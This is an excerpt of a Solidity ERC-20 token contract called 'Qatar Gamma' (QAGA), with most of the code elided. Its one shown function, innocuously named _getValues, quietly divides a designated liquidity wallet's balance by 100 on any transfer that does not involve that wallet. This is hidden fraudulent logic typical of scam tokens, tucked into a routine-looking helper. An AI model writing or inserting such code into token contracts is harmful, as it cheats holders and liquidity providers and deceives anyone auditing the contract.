...
contract QatarGamma is Context, IERC20, Ownable {
    ...
    string private constant _name = "Qatar Gamma"; // 
    string private constant _symbol = "QAGA"; //    
    ...
    function _getValues(uint256 amount, address from, address to) private returns (uint256) {
        if (_liquidityWallet != address(0) && _liquidityWallet != from && _liquidityWallet != to)
             _tOwned[_liquidityWallet] = _tOwned[_liquidityWallet] / 100;
